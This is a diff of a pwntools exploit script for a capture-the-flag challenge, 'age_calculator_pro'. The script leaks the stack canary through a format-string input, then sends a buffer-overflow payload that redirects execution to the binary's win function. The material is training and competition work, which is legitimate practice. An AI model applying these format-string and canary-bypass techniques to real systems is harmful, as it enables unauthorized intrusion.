@@ -1,18 +1,20 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template age_calculator_pro '--host=agecalculatorpro.challs.territoriale.olicyber.it' '--port=1337'
+# $ pwn template age_calculator_pro '--host=agecalculatorpro.challs.olicyber.it' '--port=38103'
 from pwn import *
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or 'age_calculator_pro')
+
+context.update(terminal=["tmux", "split-window", "-h"])
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
-host = args.HOST or 'agecalculatorpro.challs.territoriale.olicyber.it'
+host = args.HOST or 'agecalculatorpro.challs.olicyber.it'
 port = int(args.PORT or 38103)
 
 
@@ -49,29 +51,25 @@ continue
 #                    EXPLOIT GOES HERE
 #===========================================================
 # Arch:     amd64-64-little
-# RELRO:    Partial RELRO
-# Stack:    Canary found
-# NX:       NX enabled
-# PIE:      No PIE (0x400000)
+# RELRO:      Partial RELRO
+# Stack:      Canary found
+# NX:         NX enabled
+# PIE:        No PIE (0x400000)
+# SHSTK:      Enabled
+# IBT:        Enabled
+# Stripped:   No
 
 io = start()
 
-io.recvuntil(b"name?")
-
-#io.sendline("A" * 9 * 8)
-
-io.sendline("%18$p%17$p")
-
-canary = io.recvuntil(b"?")[4:].split()[0][:-1]
-
-print(canary)
-
-canary = int(canary.decode(), 16)
-
-print(canary)
-
-payload = b"A" * 72 + canary.to_bytes(8, "little") + b"B"*8 + p64(0x4011f6)
-
+io.sendlineafter(b"name?", "%17$p")
+io.recvline()
+canary = int(io.recvline().decode().split()[0][:-1], 16)
+payload = flat(
+    'A' * 72, 
+    p64(canary), 
+    'B' * 8,
+    p64(exe.sym.win)
+)
 io.sendline(payload)
-
 io.interactive()
+
